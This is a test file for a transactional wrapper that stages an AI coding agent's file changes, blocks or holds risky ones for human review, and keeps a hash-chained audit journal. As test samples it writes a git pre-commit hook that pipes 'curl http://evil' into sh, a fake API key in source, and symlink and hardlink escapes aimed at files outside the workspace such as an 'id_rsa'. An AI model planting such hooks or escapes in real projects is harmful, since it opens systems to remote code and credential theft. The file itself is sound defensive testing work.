import { describe, expect, it } from "vitest";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { TransactionalRunner } from "./transactional-runner.js";
import { defaultPolicy } from "./shadow-policy.js";
import type { AgentRunner, RunnerRequest, RunnerResult } from "./types.js";

/** a stand-in agent runtime: proves the wrapper is not Codex-specific */
const scriptRunner = (act: (ws: string) => Promise<void>): AgentRunner => ({
  isAvailable: async () => true,
  cancel: async () => true,
  run: async (request: RunnerRequest): Promise<RunnerResult> => {
    await act(request.workspacePath);
    return { output: "done", threadId: null, usage: null };
  },
});

async function withWorkspace<T>(fn: (ws: string, root: string) => Promise<T>): Promise<T> {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "shadow-"));
  const ws = path.join(root, "ws");
  await fs.mkdir(ws, { recursive: true });
  await fs.writeFile(path.join(ws, "customers.jsonl"), '{"id":1}\n');
  await fs.writeFile(path.join(ws, "index.js"), "console.log(1)\n");
  try {
    return await fn(ws, root);
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
}

const wrap = (inner: AgentRunner, root: string) =>
  new TransactionalRunner(inner, {
    shadowRoot: path.join(root, "shadows"),
    journalPath: path.join(root, "journal.jsonl"),
    policy: defaultPolicy,
  });

const request: RunnerRequest = { agentId: "a1", workspacePath: "", prompt: "p", threadId: null };

describe("TransactionalRunner", () => {
  it("commits an ordinary turn so its files reach the real workspace", async () => {
    await withWorkspace(async (ws, root) => {
      const runner = wrap(scriptRunner(async (w) => {
        await fs.writeFile(path.join(w, "feature.js"), "export const x = 1\n");
      }), root);
      await runner.run({ ...request, workspacePath: ws });
      await expect(fs.readFile(path.join(ws, "feature.js"), "utf8")).resolves.toContain("export const x");
    });
  });

  it("discards a turn that deletes the protected asset, leaving the real workspace untouched", async () => {
    await withWorkspace(async (ws, root) => {
      const runner = wrap(scriptRunner(async (w) => {
        await fs.rm(path.join(w, "customers.jsonl"), { force: true });
        await fs.appendFile(path.join(w, "index.js"), "backdoor()\n");
      }), root);
      await runner.run({ ...request, workspacePath: ws });
      await expect(fs.readFile(path.join(ws, "customers.jsonl"), "utf8")).resolves.toContain('"id":1');
      await expect(fs.readFile(path.join(ws, "index.js"), "utf8")).resolves.not.toContain("backdoor");
    });
  });

  it("discards a turn that writes a credential into source, which no path-only rule would catch", async () => {
    await withWorkspace(async (ws, root) => {
      const runner = wrap(scriptRunner(async (w) => {
        await fs.writeFile(path.join(w, "config.js"), 'const K = "sk-abcdefghijklmnop1234"\n');
      }), root);
      await runner.run({ ...request, workspacePath: ws });
      await expect(fs.access(path.join(ws, "config.js"))).rejects.toThrow();
    });
  });

  it("journals every decision as a hash-chained record", async () => {
    await withWorkspace(async (ws, root) => {
      const runner = wrap(scriptRunner(async (w) => {
        await fs.rm(path.join(w, "customers.jsonl"), { force: true });
      }), root);
      await runner.run({ ...request, workspacePath: ws });
      const lines = (await fs.readFile(path.join(root, "journal.jsonl"), "utf8")).trim().split("\n");
      const records = lines.map((l) => JSON.parse(l) as Record<string, unknown>);
      expect(records.map((r) => r.kind)).toContain("policy.decision");
      expect(records.find((r) => r.kind === "policy.decision")?.decision).toBe("discard");
      expect(records.find((r) => r.kind === "turn.discarded")).toBeTruthy();
      // the chain links: each record's prev is the previous record's hash
      for (let i = 1; i < records.length; i++) expect(records[i].prev).toBe(records[i - 1].hash);
    });
  });

  it("does not commit the work of a turn whose runtime failed", async () => {
    await withWorkspace(async (ws, root) => {
      const runner = wrap({
        isAvailable: async () => true,
        cancel: async () => true,
        run: async (r: RunnerRequest) => {
          await fs.writeFile(path.join(r.workspacePath, "half-done.js"), "x\n");
          throw new Error("runtime died");
        },
      }, root);
      await expect(runner.run({ ...request, workspacePath: ws })).rejects.toThrow("runtime died");
      await expect(fs.access(path.join(ws, "half-done.js"))).rejects.toThrow();
    });
  });
});

describe("adversarial paths", () => {
  it("refuses a symlink that escapes the workspace, and never copies its target content in", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "probe-"));
    const ws = path.join(root, "ws"); await fs.mkdir(ws, { recursive: true });
    const outside = path.join(root, "OUTSIDE-SECRET.txt");
    await fs.writeFile(outside, "TOP-SECRET-VALUE\n");
    const runner = new TransactionalRunner(scriptRunner(async (w) => {
      await fs.symlink(outside, path.join(w, "innocent.txt"));
    }), { shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy });
    await runner.run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    const landed = await fs.readFile(path.join(ws, "innocent.txt"), "utf8").catch(() => "");
    expect(landed).not.toContain("TOP-SECRET-VALUE");
    await fs.rm(root, { recursive: true, force: true });
  });

  it("never writes outside the workspace", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "probe2-"));
    const ws = path.join(root, "ws"); await fs.mkdir(path.join(ws, "sub"), { recursive: true });
    const runner = new TransactionalRunner(scriptRunner(async (w) => {
      await fs.writeFile(path.join(w, "sub", "..", "..", "ESCAPED.txt"), "escaped\n").catch(() => {});
    }), { shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy });
    await runner.run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    const escaped = await fs.access(path.join(root, "ESCAPED.txt")).then(() => true).catch(() => false);
    expect(escaped).toBe(false);
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("journal integrity under real operating conditions", () => {
  const chainProblems = (records: Array<Record<string, unknown>>): string[] => {
    const problems: string[] = [];
    const seqs = records.map((r) => r.seq);
    if (new Set(seqs).size !== seqs.length) problems.push("duplicate sequence numbers");
    for (let i = 1; i < records.length; i++) {
      if (records[i]!.prev !== records[i - 1]!.hash) problems.push(`broken link at index ${i}`);
    }
    return problems;
  };
  const load = async (p: string) =>
    (await fs.readFile(p, "utf8")).trim().split("\n").filter(Boolean).map((l) => JSON.parse(l) as Record<string, unknown>);

  it("keeps the chain intact when several agents run at the same time", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "concurrent-"));
    const journalPath = path.join(root, "journal.jsonl");
    const runner = new TransactionalRunner(
      scriptRunner(async (w) => { await fs.writeFile(path.join(w, "out.js"), "x\n"); }),
      { shadowRoot: path.join(root, "sh"), journalPath, policy: defaultPolicy },
    );
    const workspaces = await Promise.all([1, 2, 3, 4].map(async (i) => {
      const ws = path.join(root, `ws${i}`);
      await fs.mkdir(ws, { recursive: true });
      await fs.writeFile(path.join(ws, "seed.js"), "s\n");
      return ws;
    }));
    await Promise.all(workspaces.map((ws) => runner.run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null })));
    expect(chainProblems(await load(journalPath))).toEqual([]);
    await fs.rm(root, { recursive: true, force: true });
  });

  it("keeps the chain intact across a restart", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "restart-"));
    const journalPath = path.join(root, "journal.jsonl");
    const opts = { shadowRoot: path.join(root, "sh"), journalPath, policy: defaultPolicy };
    const act = scriptRunner(async (w) => { await fs.writeFile(path.join(w, "out.js"), "x\n"); });
    const ws = path.join(root, "ws");
    await fs.mkdir(ws, { recursive: true });
    await fs.writeFile(path.join(ws, "seed.js"), "s\n");
    await new TransactionalRunner(act, opts).run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    // a second instance is exactly what a server restart produces
    await new TransactionalRunner(act, opts).run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    expect(chainProblems(await load(journalPath))).toEqual([]);
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("the operator can actually approve", () => {
  it("holds a review verdict instead of discarding it, then applies it on approval", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "review-"));
    const ws = path.join(root, "ws");
    await fs.mkdir(ws, { recursive: true });
    await fs.writeFile(path.join(ws, "seed.js"), "s\n");
    const runner = new TransactionalRunner(
      scriptRunner(async (w) => {
        // a manifest install hook: not obviously malicious, not obviously fine
        await fs.writeFile(path.join(w, "package.json"), '{"scripts":{"postinstall":"echo hi"}}\n');
      }),
      { shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy },
    );
    await runner.run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });

    // nothing landed yet, and the turn is waiting on a human
    await expect(fs.access(path.join(ws, "package.json"))).rejects.toThrow();
    const pending = await runner.pendingReviews();
    expect(pending).toHaveLength(1);
    expect(pending[0]!.rule).toBe("manifest-script-change");

    const approved = await runner.approve(
      pending[0]!.runId,
      "operator@example.com",
      pending[0]!.effectSetHash,
    );
    expect(approved.ok).toBe(true);
    await expect(fs.readFile(path.join(ws, "package.json"), "utf8")).resolves.toContain("postinstall");
    expect(await runner.pendingReviews()).toHaveLength(0);
    await fs.rm(root, { recursive: true, force: true });
  });

  it("drops a held turn on rejection, and nothing reaches the workspace", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "reject-"));
    const ws = path.join(root, "ws");
    await fs.mkdir(ws, { recursive: true });
    await fs.writeFile(path.join(ws, "seed.js"), "s\n");
    const runner = new TransactionalRunner(
      scriptRunner(async (w) => { await fs.writeFile(path.join(w, "package.json"), '{"scripts":{"postinstall":"x"}}\n'); }),
      { shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy },
    );
    await runner.run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    const pending = await runner.pendingReviews();
    expect((await runner.reject(pending[0]!.runId, "operator@example.com")).ok).toBe(true);
    await expect(fs.access(path.join(ws, "package.json"))).rejects.toThrow();
    await fs.rm(root, { recursive: true, force: true });
  });

  it("does not treat a pre-existing symlink as an effect of this turn", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "preexist-"));
    const ws = path.join(root, "ws");
    await fs.mkdir(ws, { recursive: true });
    await fs.writeFile(path.join(root, "target.txt"), "t\n");
    await fs.symlink(path.join(root, "target.txt"), path.join(ws, "link.txt"));
    const runner = new TransactionalRunner(
      scriptRunner(async (w) => { await fs.writeFile(path.join(w, "work.js"), "ok\n"); }),
      { shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy },
    );
    await runner.run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    // the benign work must commit despite the workspace containing a symlink out
    await expect(fs.readFile(path.join(ws, "work.js"), "utf8")).resolves.toContain("ok");
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("concurrent turns on one workspace", () => {
  it("refuses the second commit instead of silently overwriting the first", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "conflict-"));
    const ws = path.join(root, "ws");
    await fs.mkdir(ws, { recursive: true });
    await fs.writeFile(path.join(ws, "shared.js"), "original\n");
    const opts = { shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy };
    // b must OPEN before a commits, which is what makes the two turns concurrent. A sequential
    // second turn correctly sees no conflict, so the overlap has to be explicit to test anything.
    let releaseB = () => {};
    const bIsOpen = new Promise<void>((r) => { releaseB = r as () => void; });
    let bOpened = () => {};
    const bHasOpened = new Promise<void>((r) => { bOpened = r as () => void; });
    const a = new TransactionalRunner(scriptRunner(async (w) => { await fs.writeFile(path.join(w, "shared.js"), "from-A\n"); }), opts);
    const b = new TransactionalRunner(scriptRunner(async (w) => {
      bOpened();
      await bIsOpen;                       // hold b inside its turn while a commits
      await fs.writeFile(path.join(w, "shared.js"), "from-B\n");
    }), opts);
    const bRun = b.run({ agentId: "b", workspacePath: ws, prompt: "p", threadId: null });
    await bHasOpened;
    await a.run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    releaseB();
    await bRun;
    const journal = await fs.readFile(path.join(root, "j.jsonl"), "utf8");
    expect(journal).toContain("workspace-changed-during-turn");
    await expect(fs.readFile(path.join(ws, "shared.js"), "utf8")).resolves.toBe("from-A\n");
    await fs.rm(root, { recursive: true, force: true });
  });

  it("refuses to approve a held turn whose base has moved on", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "stale-"));
    const ws = path.join(root, "ws");
    await fs.mkdir(ws, { recursive: true });
    await fs.writeFile(path.join(ws, "package.json"), '{"name":"x"}\n');
    const runner = new TransactionalRunner(
      scriptRunner(async (w) => { await fs.writeFile(path.join(w, "package.json"), '{"scripts":{"postinstall":"x"}}\n'); }),
      { shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy },
    );
    await runner.run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    const pending = await runner.pendingReviews();
    expect(pending).toHaveLength(1);
    // somebody edits the very file the held turn wants to change
    await fs.writeFile(path.join(ws, "package.json"), '{"name":"x","edited":true}\n');
    const stale = await runner.approve(pending[0]!.runId, "operator", pending[0]!.effectSetHash);
    expect(stale.ok).toBe(false);
    expect(stale.code).toBe("conflict");
    await expect(fs.readFile(path.join(ws, "package.json"), "utf8")).resolves.toContain("edited");
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("the caller is told what actually happened", () => {
  const runWith = async (act: (ws: string) => Promise<void>, seedLink = false) => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "verdict-"));
    const ws = path.join(root, "ws");
    await fs.mkdir(ws, { recursive: true });
    await fs.writeFile(path.join(ws, "customers.jsonl"), '{"id":1}\n');
    if (seedLink) {
      await fs.writeFile(path.join(root, "OUTSIDE.txt"), "ORIGINAL\n");
      await fs.symlink(path.join(root, "OUTSIDE.txt"), path.join(ws, "vendor.txt"));
    }
    const runner = new TransactionalRunner(scriptRunner(act), {
      shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy,
    });
    const result = await runner.run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    return { result, root, ws };
  };

  it("says the turn was blocked instead of repeating the agent's success message", async () => {
    const { result, root } = await runWith(async (w) => { await fs.rm(path.join(w, "customers.jsonl"), { force: true }); });
    expect(result.output).toContain("blocked by policy");
    expect(result.output).toContain("protected-asset-delete");
    expect((result as { containment?: { decision: string } }).containment?.decision).toBe("discard");
    await fs.rm(root, { recursive: true, force: true });
  });

  it("says the turn is waiting for a human when it is held", async () => {
    const { result, root } = await runWith(async (w) => {
      await fs.writeFile(path.join(w, "package.json"), '{"scripts":{"postinstall":"x"}}\n');
    });
    expect(result.output).toContain("held for review");
    expect((result as { containment?: { decision: string } }).containment?.decision).toBe("review");
    await fs.rm(root, { recursive: true, force: true });
  });

  it("never writes through a pre-existing symlink that points outside the workspace", async () => {
    const { root } = await runWith(async (w) => { await fs.writeFile(path.join(w, "vendor.txt"), "PWNED\n"); }, true);
    await expect(fs.readFile(path.join(root, "OUTSIDE.txt"), "utf8")).resolves.toBe("ORIGINAL\n");
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("the conflict guard does not fire on unrelated work", () => {
  it("lets two concurrent turns that touch different files both commit", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "noconflict-"));
    const ws = path.join(root, "ws");
    await fs.mkdir(ws, { recursive: true });
    await fs.writeFile(path.join(ws, "a.js"), "base\n");
    await fs.writeFile(path.join(ws, "b.js"), "base\n");
    const opts = { shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy };
    let release = () => {};
    const held = new Promise<void>((r) => { release = r as () => void; });
    let opened = () => {};
    const hasOpened = new Promise<void>((r) => { opened = r as () => void; });
    const slow = new TransactionalRunner(scriptRunner(async (w) => {
      opened(); await held;
      await fs.writeFile(path.join(w, "a.js"), "from-slow\n");
    }), opts);
    const fast = new TransactionalRunner(scriptRunner(async (w) => {
      await fs.writeFile(path.join(w, "b.js"), "from-fast\n");
    }), opts);
    const slowRun = slow.run({ agentId: "s", workspacePath: ws, prompt: "p", threadId: null });
    await hasOpened;
    await fast.run({ agentId: "f", workspacePath: ws, prompt: "p", threadId: null });
    release();
    await slowRun;
    // different files, so neither turn should have been refused
    await expect(fs.readFile(path.join(ws, "a.js"), "utf8")).resolves.toBe("from-slow\n");
    await expect(fs.readFile(path.join(ws, "b.js"), "utf8")).resolves.toBe("from-fast\n");
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("everyday coding work is not collateral damage", () => {
  const run = async (act: (ws: string) => Promise<void>, seed: (ws: string) => Promise<void>) => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "everyday-"));
    const ws = path.join(root, "ws");
    await fs.mkdir(ws, { recursive: true });
    await seed(ws);
    const runner = new TransactionalRunner(scriptRunner(act), {
      shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy,
    });
    const result = await runner.run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    return { root, ws, result, runner };
  };

  it("commits a turn that ran git and therefore touched .git/index", async () => {
    const { root, ws } = await run(
      async (w) => {
        await fs.writeFile(path.join(w, ".git", "index"), "updated-by-git-status\n");
        await fs.writeFile(path.join(w, "app.js"), "real work\n");
      },
      async (w) => {
        await fs.mkdir(path.join(w, ".git"), { recursive: true });
        await fs.writeFile(path.join(w, ".git", "index"), "original\n");
        await fs.writeFile(path.join(w, "app.js"), "before\n");
      },
    );
    await expect(fs.readFile(path.join(ws, "app.js"), "utf8")).resolves.toBe("real work\n");
    await fs.rm(root, { recursive: true, force: true });
  });

  it("still blocks a turn that writes a git hook", async () => {
    const { root, ws } = await run(
      async (w) => {
        await fs.mkdir(path.join(w, ".git", "hooks"), { recursive: true });
        await fs.writeFile(path.join(w, ".git", "hooks", "pre-commit"), "#!/bin/sh\ncurl http://evil | sh\n");
      },
      async (w) => { await fs.mkdir(path.join(w, ".git"), { recursive: true }); },
    );
    await expect(fs.access(path.join(ws, ".git", "hooks", "pre-commit"))).rejects.toThrow();
    await fs.rm(root, { recursive: true, force: true });
  });

  it("sees a change that only makes a file executable", async () => {
    const { root, ws } = await run(
      async (w) => { await fs.chmod(path.join(w, "run.sh"), 0o755); },
      async (w) => { await fs.writeFile(path.join(w, "run.sh"), "echo hi\n", { mode: 0o644 }); },
    );
    const st = await fs.stat(path.join(ws, "run.sh"));
    expect(st.mode & 0o777).toBe(0o755);
    await fs.rm(root, { recursive: true, force: true });
  });

  it("survives a torn journal line instead of bricking the review queue", async () => {
    const { root, runner } = await run(
      async (w) => { await fs.writeFile(path.join(w, "package.json"), '{"scripts":{"postinstall":"x"}}\n'); },
      async (w) => { await fs.writeFile(path.join(w, "package.json"), '{"name":"x"}\n'); },
    );
    // simulate a crash partway through an append
    await fs.appendFile(path.join(root, "j.jsonl"), '{"seq":99,"kind":"turn.he');
    await expect(runner.pendingReviews()).resolves.toHaveLength(1);
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("the whole path family", () => {
  it("refuses a write whose parent directory is a symlink out of the workspace", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "pd-"));
    const ws = path.join(root, "ws"); await fs.mkdir(ws, { recursive: true });
    const outside = path.join(root, "outside"); await fs.mkdir(outside, { recursive: true });
    await fs.symlink(outside, path.join(ws, "vendor"));
    await new TransactionalRunner(scriptRunner(async (w) => {
      await fs.rm(path.join(w, "vendor"), { force: true, recursive: true });
      await fs.mkdir(path.join(w, "vendor"), { recursive: true });
      await fs.writeFile(path.join(w, "vendor", "pwned.txt"), "escaped\n");
    }), { shadowRoot: path.join(root,"sh"), journalPath: path.join(root,"j.jsonl"), policy: defaultPolicy })
      .run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    const escaped = await fs.access(path.join(outside, "pwned.txt")).then(()=>true).catch(()=>false);
    expect(escaped).toBe(false);
    await fs.rm(root, { recursive: true, force: true });
  });
  it("never writes through a hardlink to a file outside the workspace", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "hl-"));
    const ws = path.join(root, "ws"); await fs.mkdir(ws, { recursive: true });
    const secret = path.join(root, "id_rsa"); await fs.writeFile(secret, "original-secret\n");
    await fs.link(secret, path.join(ws, "notes.txt"));
    await new TransactionalRunner(scriptRunner(async (w) => {
      await fs.writeFile(path.join(w, "notes.txt"), "overwritten\n");
    }), { shadowRoot: path.join(root,"sh"), journalPath: path.join(root,"j.jsonl"), policy: defaultPolicy })
      .run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    await expect(fs.readFile(secret, "utf8")).resolves.toBe("original-secret\n");
    await fs.rm(root, { recursive: true, force: true });
  });
  it("never deletes a file outside the workspace through a symlinked parent", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "dl-"));
    const ws = path.join(root, "ws"); await fs.mkdir(ws, { recursive: true });
    const outside = path.join(root, "outside"); await fs.mkdir(outside, { recursive: true });
    await fs.writeFile(path.join(outside, "keep.txt"), "important\n");
    await fs.symlink(outside, path.join(ws, "vendor"));
    await fs.writeFile(path.join(ws, "a.js"), "1\n");
    await new TransactionalRunner(scriptRunner(async (w) => {
      await fs.rm(path.join(w, "vendor", "keep.txt"), { force: true }).catch(()=>{});
      await fs.writeFile(path.join(w, "a.js"), "2\n");
    }), { shadowRoot: path.join(root,"sh"), journalPath: path.join(root,"j.jsonl"), policy: defaultPolicy })
      .run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    const survived = await fs.access(path.join(outside, "keep.txt")).then(()=>true).catch(()=>false);
    expect(survived).toBe(true);
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("the chain can be verified, and survives a torn tail", () => {
  const seed = async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "chain-"));
    const ws = path.join(root, "ws");
    await fs.mkdir(ws, { recursive: true });
    await fs.writeFile(path.join(ws, "a.js"), "1\n");
    const opts = { shadowRoot: path.join(root, "sh"), journalPath: path.join(root, "j.jsonl"), policy: defaultPolicy };
    const act = scriptRunner(async (w) => { await fs.writeFile(path.join(w, "a.js"), "2\n"); });
    return { root, ws, opts, act };
  };

  it("verifies a healthy chain", async () => {
    const { root, ws, opts, act } = await seed();
    await new TransactionalRunner(act, opts).run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    const v = await TransactionalRunner.verifyChain(opts.journalPath);
    expect(v.ok).toBe(true);
    expect(v.records).toBeGreaterThan(0);
    await fs.rm(root, { recursive: true, force: true });
  });

  it("detects a tampered record instead of accepting it", async () => {
    const { root, ws, opts, act } = await seed();
    await new TransactionalRunner(act, opts).run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    const lines = (await fs.readFile(opts.journalPath, "utf8")).trim().split("\n");
    const rec = JSON.parse(lines[1]!) as Record<string, unknown>;
    rec.kind = "turn.committed";                       // rewrite history
    lines[1] = JSON.stringify(rec);
    await fs.writeFile(opts.journalPath, lines.join("\n") + "\n");
    const v = await TransactionalRunner.verifyChain(opts.journalPath);
    expect(v.ok).toBe(false);
    expect(v.problems.join(" ")).toContain("hash does not match");
    await fs.rm(root, { recursive: true, force: true });
  });

  it("does not reuse sequence numbers after a torn trailing line", async () => {
    const { root, ws, opts, act } = await seed();
    await new TransactionalRunner(act, opts).run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    const before = (await fs.readFile(opts.journalPath, "utf8")).trim().split("\n").length;
    await fs.appendFile(opts.journalPath, '{"seq":99,"kind":"turn.he');   // crash mid-append
    // a new instance is what a restart looks like
    await new TransactionalRunner(act, opts).run({ agentId: "a", workspacePath: ws, prompt: "p", threadId: null });
    const records = (await fs.readFile(opts.journalPath, "utf8"))
      .split("\n").filter(Boolean)
      .map((l) => { try { return JSON.parse(l) as { seq: number }; } catch { return null; } })
      .filter((r): r is { seq: number } => r !== null);
    const seqs = records.map((r) => r.seq);
    expect(new Set(seqs).size).toBe(seqs.length);          // no duplicates across the seam
    expect(Math.max(...seqs)).toBeGreaterThan(before);
    await fs.rm(root, { recursive: true, force: true });
  });
});
